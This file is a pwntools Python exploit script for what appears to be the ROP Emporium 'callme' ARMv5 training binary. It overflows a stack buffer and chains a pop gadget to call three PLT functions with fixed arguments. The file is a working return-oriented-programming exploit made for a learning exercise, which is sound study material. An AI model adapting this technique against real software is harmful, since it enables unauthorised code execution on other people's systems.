#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabi"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'callme_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./callme_armv5_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

padding = b'A' * cyclic_find(0x6161616a)
payload = padding

ARGS = p32(0xdeadbeef) + p32(0xcafebabe) + p32(0xd00df00d)

# (r2) iS - to print sections adresses
# (r2) pd @ 0x000105e0 - to print .plt section
CALLME_1_PLT = p32(0x10618)
CALLME_2_PLT = p32(0x1066c)
CALLME_3_PLT = p32(0x1060c)

# ROPgadget --binary callme_armv5
# 0x00010870 : pop {r0, r1, r2, lr, pc}
POP_R0_R1_R2_LR_PC = p32(0x10870)

payload += POP_R0_R1_R2_LR_PC + ARGS + POP_R0_R1_R2_LR_PC + CALLME_1_PLT
payload += ARGS + POP_R0_R1_R2_LR_PC + CALLME_2_PLT
payload += ARGS + p32(0xa5a5a5a5) + CALLME_3_PLT

io = start()

io.recvuntil(b"> ")
io.sendline(payload)

io.interactive()
